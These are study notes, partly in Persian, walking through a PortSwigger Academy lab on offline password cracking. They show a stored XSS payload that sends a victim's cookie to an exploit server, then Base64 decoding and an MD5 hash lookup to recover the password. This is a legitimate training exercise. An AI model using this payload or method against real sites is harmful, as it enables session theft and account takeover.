https://portswigger.net/web-security/authentication/other-mechanisms#keeping-users-logged-in

دومین آزمایشگاه اینجاست

Lab: Offline password cracking:
https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking

* Even if the attacker is not able to create their own account

* such as XSS, an attacker could steal another user's "remember me" 
  cookie and deduce how the cookie is constructed from that.

* If the website was Open Source 
  => key details of the cookie construction may even be publicly documented. 

* Hashed versions of well-known password lists are available online, 
  => so if the user's password appears in one of these lists,

* Information lab:
    Your credentials: wiener:peter
    Victim's username: carlos

* Learning path:
    If you're following our suggested learning path, 
    please note that this lab requires some 
    understanding of topics that we haven't covered yet. 
    Don't worry if you get stuck; 
    try coming back later once you've developed your knowledge further.

Information:
  * stores the user's password hash in a cookie.

  * The lab also contains an XSS vulnerability in the comment functionality.


To solve:
  * obtain Carlos's stay-logged-in cookie
  * use it to crack his password
  * log in as carlos
  * delete his account from the "My account" page


Your credentials: wiener:peter

Victim's username: carlos password = ?


Step1: Burp + Foxy

Step2: with wiener investigate "Stay logged in" functionality

    In the Inspector

Step3: confirm stay-logged-in cookie is Base64 encoded

Step4:  > Proxy  
        > HTTP history tab   
        > Response 
        > your login request 
        > highlight the stay-logged-in cookie 
        > confirm is true:
        username+':'+md5HashOfPassword


*****  > Log Out now !!!!


Step5: Observe comment functionality is vulnerable to XSS.

  * In comment box write this:
      <img src="x" onerror="alert(hello)" />
  * Name:
      jlsdafli
  * Email:
      ;lksdfg@hacker.com

> Go back to blog 
> Result = alert = is done
          confirm is XSS vulnerable




Step6: Go to the exploit server and make a note of the URL.
            
**Like Burp Collabulator --- Copy URL for Out-Off band
       
       From https://.....academy.net/

Step7: post a comment +  stored XSS payload 

        <script>document.location='https://exploit-0ae300f2049915888358c7170106005c.exploit-server.net/'+document.cookie</script>

Step8: On the exploit server, open the access log

  Result: GET request from the victim containing their stay-logged-in cookie. 

  Get stay-login Hashed and decode it


Step9: Decode the cookie in Burp Decoder.

   -> Base64 <-

  Result like this > carlos:26323c16d5f4dabff3bb136f2460a943

   -> onceuponatime <-

Step10: Copy the hash and paste it into a search engine.

  Result: password is "onceuponatime"


Step11: Log in to the victim's account

Step12: delete their account to solve the lab









































